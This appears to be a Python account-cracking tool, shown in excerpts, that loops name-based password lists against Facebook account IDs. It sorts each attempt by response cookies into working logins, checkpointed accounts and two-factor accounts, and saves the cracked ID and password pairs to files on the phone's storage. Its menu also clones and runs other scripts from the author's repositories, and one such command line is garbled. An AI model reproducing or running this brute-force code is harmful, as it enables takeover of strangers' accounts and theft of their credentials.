...
#created by DIWASH
#team name hbf
#tottaly written by DIWASH GYAWALI
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; DIWASH \x07')
...
ha = current.day
today = date.today()
DIWASH2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
import random
...
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m DIWASH-king-06                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mDIWASH WORLD                  \033[1;31m   │
...
def saprate():
    ...
    print('\033[1;32m Example /sdcard/DIWASH-81.txt')
...
def main():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print("           \x1b[97m[\033[37;41m  WELCOME. TO DIWASH TOOL \033[0;m] ")
    ...
    print(f"{RED}[09] {WHITE}FACEBOOK BOT") [ Not working]
    ...
    if DIWASH in ["1","01"]: 
        ...
        BOTX()
    elif DIWASH in ["10","10"]:
        os.system("xdg-open https://youtube.com/c/DIWASHworld")
    elif DIWASH in ["0","00"]:
...
def File_creating():
    os.system(f"git clone https://github.com/DIWASH-king-06/DUMP && cd DUMP && python DUMP.py")

def PROTECT():
    os.system(" rm -rf DATA_PROTECT && git clone https://github.com/DIWASH-king-06/DATA_PROTECT && cd DATA_PROTECT && python PROTECTOR.py")

def CYTHONIZER():
    os.system("rm -rf Cython_Changer && git clone https://github.com/DIWASH-king-06/Cython_Changer && cd Cython_Changer && python3 Run.py")


def BOTX():
    os.system("rm -rf BOT && git clone https://github.com/DIWASH-king-06/ BOT && cd BOTgit clone https://github.com/DIWASH-king-06/ BOT && cd BOT && python3 DIWASH.py")
...
def file_crack():
    ...
    linex()
    opt_method = input(f'CHOOSE SERVER {DIWASH2} : ')
    os.system('clear')
    print(logo)
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/DIWASH_OK.txt\n[•] CP IDS SAVE : /sdcard/DIWASH_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[DIWASH 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio DIWASH_OK.mp3")
                print('\r\033[1;32m[DIWASH-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/DIWASH_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    os.system("play-audio DIWASH_2F.mp3")
                    print('\r\033[1;35m[DIWASH-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/DIWASH_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio DIWASH_CP.mp3")
                    print('\r\033[1;31m[DIWASH-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/DIWASH_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
...
def method2(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio DIWASH_OK.mp3")
                print('\r\033[1;32m[DIWASH-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/DIWASH_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio DIWASH_2F.mp3")
                    print('\r\033[1;35m[DIWASH-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/DIWASH_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio DIWASH_CP.mp3")
                    print('\r\033[1;31m[DIWASH-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/DIWASH_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[DIWASH 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    os.system("play-audio DIWASH_OK.mp3")
                    print('\r\033[1;92m[DIWASH-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/DIWASH_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio DIWASH_2F.mp3")
                        print('\r\033[1;95m[DIWASH-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/DIWASH_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                            ...
                            os.system("play-audio DIWASH_CP.mp3")
                            print('\r\033[1;94m[DIWASH-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/DIWASH_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) DIWASH
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/DIWASH-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/DIWASH-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/DIWASH-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/DIWASH-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    ...
                    open('/sdcard/DIWASH-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[DIWASH 🔥] [%s] \33[1;97m[OK:%s{DIWASH2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
